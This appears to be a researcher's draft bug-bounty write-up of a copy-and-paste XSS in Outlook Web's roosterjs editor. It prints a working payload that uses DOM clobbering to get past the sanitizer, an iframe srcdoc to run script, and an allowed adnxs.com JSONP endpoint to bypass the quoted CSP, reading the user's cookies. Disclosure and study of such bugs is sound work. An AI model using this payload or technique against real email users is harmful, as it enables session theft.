---
title: [Rough DRAFT] Copy and Paste XSS in outlook
author: TheGrandPew
date: 2021-01-26 11:33:00 +0800
categories: [Blogging, Bounties]
tags: [xss, copy&paste, csp]
math: true
toc: true
image: /assets/img/Microsoft-Outlook-logo.jpg
---


## The Bug

---

```
<form><iframe srcdoc='<script src="https://ib.adnxs.com/jpt?id=7114452&callback=alert(`Domain:\x20${window.parent.location.href}\nCookies:\x20${window.parent.document.cookie}`);"></script>'></iframe><input name=firstChild></form>
```
Lets skip strait to the bug because thats why your all here. The Bug I found was a copy and paste xss in the wysiwyg email editor in outlook web.

---

## Part One: Understanding the wysiwyg editor in outlook

---

The wysiwyg that outlook uses is called rooster-js https://github.com/microsoft/roosterjs. The part I had a look at was the copy and paste support provided by it, the basic flow of of the wysiwyg cp&paste was that firstly it would get the data off the clipboard as a html string. It will then go and santize the html string with its self rolled html sanitzer (really bad idea cause html sanitizers a hard). Finaly it will go and insert that html into the node of the editor.

---

## Part Two: blowing the brains of the rooster js html sanitizer

---

Due to the html sanitzer I couldn't just insert a normal xss payload, no I needed to find a way to bypass it. The html sanitizer [code](https://github.com/microsoft/roosterjs/blob/de8afd8ef2a40fc07cea01a0f883653fbb808f5f/packages/roosterjs-editor-dom/lib/htmlSanitizer/HtmlSanitizer.ts) I needed to bypass was using the DomParser js api to parse the a html string into a dom tree and then loop through the dom-tree and check for html nodes that are not in its whitelist.


The Bypass I found consited around this snippet of [code](https://github.com/microsoft/roosterjs/blob/de8afd8ef2a40fc07cea01a0f883653fbb808f5f/packages/roosterjs-editor-dom/lib/htmlSanitizer/HtmlSanitizer.ts#L204), the html sanitizer would access the property ?.firstChild of each html node to get the next element in the dom-tree. To bypass this protection I used a teqnique called Dom clobbering to overwrite values like ?.firstChild on a html element so that i can sneek my own html that wont get sanitzed into a html string. The exact dom clobbering payload I used was a form with an input that name was firstChild [```<form><myhtml></myhtml><input name=firstChild>```] this allowed me to place any html I wanted before the input tag exellent! 
 
---

## Part Three: outlooks csp bypass

---

As soon as I had html injection I ran into a problem, because this is dom based xss I can't just put in a script tag beacuse its content is only evaluated during the page load time. Luckly I knew a bypass for that, iframes that use srdoc have full access to the window.parent object and also are evaluated anytime they are appended to the document (not just at onload). Example ```<iframe srcdoc='<script>alert(window.parent.document.cookie)</script>'></iframe>``` would be the same as ```<script>alert(document.cookie)</script>```. After that all I needed was a bypass for its csp rules 
```default-src *.res.office365.com *.cdn.office.net *.cdn.partner.outlook.cn owassets.azureedge.net swx.cdn.skype.com 'self'; script-src 'nonce-1+FGBaKNzIAmrLfL/cdLDw==' *.res.office.com *.res.office365.com *.cdn.office.net *.cdn.partner.outlook.cn owassets.azureedge.net wss://*.delve.office.com:443 shellprod.msocdn.com amcdn.msauth.net amcdn.msftauth.net *.bing.com *.skype.com *.skypeassets.com *.delve.office.com *.cdn.office.net *.cdn.partner.outlook.cn static.teams.microsoft.com *.arkoselabs.com fabriciss.azureedge.net *.googleapis.com teams.microsoft.com 'report-sample' 'self' 'unsafe-inline' 'unsafe-eval' *.adnxs.com acdn.adnxs.com cdn.adnxs.com *.aolcdn.com jill.fc.yahoo.com stage-jill.fc.yahoo.com jac.yahoosandbox.com stage-jac.yahoosandbox.com; style-src *.res.office.com *.res.office365.com *.cdn.office.net *.cdn.partner.outlook.cn owassets.azureedge.net *.res.outlook.com shellprod.msocdn.com *.skype.com *.arkoselabs.com fonts.googleapis.com acthemeconfigs.blob.core.windows.net *.googleapis.com 'self' 'unsafe-inline'; img-src * data: blob: filesystem: cid:; connect-src blob: data: ninja.outlookweb.io *.res.office.com *.res.office365.com *.cdn.office.net *.cdn.partner.outlook.cn owassets.azureedge.net *.services.web.outlook.com *.res.outlook.com spoprod-a.akamaihd.net shellprod.msocdn.com *.bing.com login.live.com *.office.net *.office.com *.office365.com *.officeapps.live.com *.outlook.live.net *.skype.com *.skypeassets.com *.spoppe.com *.onedrive.com substrate.office.de substrate.office.us *.office365-net.de *.office.de *.office365.us browser.pipe.aria.microsoft.com *.gateway.messenger.live.com dev.virtualearth.net *.trouter.skype.com *.trouter.io wss://*.trouter.skype.com wss://*.trouter.skype.com:443 wss://*.trouter.io:443 media.licdn.com *.facebook.com onerm.olsvc.com client.arkoselabs.com *.qas.binginternal.com *.qas.bing.net wss://*.qas.bing.net:443 wss://*.platform.bing.com wss://*.botframework.com:443 wss://augloop.officeppe.com:443 wss://augloop-int.officeppe.com:443 wss://augloop-gcc.office.com:443 outlook.live.com graph.microsoft.com *.graph.microsoft.com graph.microsoft.de graph.microsoft.us microsoftgraph.chinacloudapi.cn *.googleapis.com *.office.microsoft.com api.box.com api.dropboxapi.com *.users.storage.live.com www.onenote.com *.storage.msn.com asgsmsproxyapi.azurewebsites.net meetingintelligenceppe.westus2.cloudapp.azure.com:9001 wss://*.pushd.svc.ms wss://*.pushs.svc.ms wss://*.pushb.svc.ms wss://*.pushp.svc.ms nleditor.osi.officeppe.net api.tenor.com pptservicescast.officeapps.live.com *.sharepoint-df.com *.sharepoint.com *.sharepoint.de wss://*.delve.office.com:443 wss://*.loki.delve.office.com:443 wss://*.loki.delve.office.com *.delve.office.com *.loki.delve.office.com loki.delve-gcc.office.com web.vortex.data.microsoft.com *.events.data.microsoft.com *.online.lync.com *.infra.lync.com *.safelinks.protection.outlook.com 'self' *.adnxs.com m.adnxs.com nym1-ib.adnxs.com ib.adnxs.com fra1-ib.adnxs.com ams1-ib.adnxs.com api.taboola.com tlx.3lift.com jill.fc.yahoo.com stage-jill.fc.yahoo.com api.msn.com arc.msn.com ris.api.iris.microsoft.com; base-uri browser.pipe.aria.microsoft.com 'self'; form-action *.officeapps.live.com https://*.sharepoint-df.com https://*.sharepoint.com https://*.sharepoint.de; object-src *.office.net *.outlook.live.net 'self'; frame-ancestors outlook.live.com *.skype.com 'self'; font-src data: *.res.office.com *.res.office365.com *.cdn.office.net *.cdn.partner.outlook.cn owassets.azureedge.net spoprod-a.akamaihd.net *.skype.com fonts.gstatic.com ms-appx-web: sharepointonline.com *.sharepointonline.com *.delve.office.com 'self'; media-src *.res.office.com *.res.office365.com *.cdn.office.net *.cdn.partner.outlook.cn owassets.azureedge.net *.skype.com *.office.net *.office365.net *.office365-net.de *.office365-net.us *.office365-net.us *.outlook.live.net ssl.gstatic.com 'self' *.adnxs.com; frame-src * data: mailto:; manifest-src 'self'; worker-src *.res.office.com *.res.office365.com *.cdn.office.net *.cdn.partner.outlook.cn owassets.azureedge.net 'self'; prefetch-src *.res.office.com *.res.office365.com *.cdn.office.net *.cdn.partner.outlook.cn owassets.azureedge.net swx.cdn.skype.com; child-src *.res.office.com *.res.office365.com *.cdn.office.net *.cdn.partner.outlook.cn owassets.azureedge.net 'self'; report-uri https://edge.skype.com/r/c?owa&version=0.3.3&app=Mail&nonce=1; upgrade-insecure-requests;```, to bypass i used the great and mighty site https://csp-evaluator.withgoogle.com/ that told me that the site https://ib.adnxs.com/ hosted a badly filtered jsonp endpoint! 
 
---

## Final words

---

Hopefully you liked my blog, if not then i guess oof. See ya <button onclick="window.close()">Bye</button>

---